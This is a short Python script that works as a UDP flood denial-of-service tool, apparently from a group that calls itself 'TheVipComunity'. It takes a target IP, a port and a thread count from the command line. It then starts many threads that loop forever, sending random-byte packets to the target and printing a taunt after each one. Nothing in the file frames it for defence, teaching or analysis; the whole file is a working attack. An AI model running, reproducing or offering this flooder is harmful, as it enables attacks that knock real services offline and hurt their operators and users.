import os
import sys
import time
import struct
import signal
import socket
import codecs
import random
import threading

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
size = int(sys.argv[4])

def x():
	data = random._urandom(781)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f" | TheVipComunityDestroyed | ")
		except:
			print(f" | TheVipComunityDestroyed | ")

def xx():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f" | TheVipComunityDestroyed | ")
		except:
			print(f" | TheVipComunityDestroyed | ")

def xxx():
	data = random._urandom(815)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f" | TheVipComunityDestroyed | ")
		except:
			print(f" | TheVipComunityDestroyed | ")

for i in range(size):
	fuckk = threading.Thread(target = x)
	fuckk.start()

for z in range(size):
	fuck = threading.Thread(target = xx)
	fuck.start()

for o in range(size):
	fuckkk = threading.Thread(target = x)
	fuckkk.start()
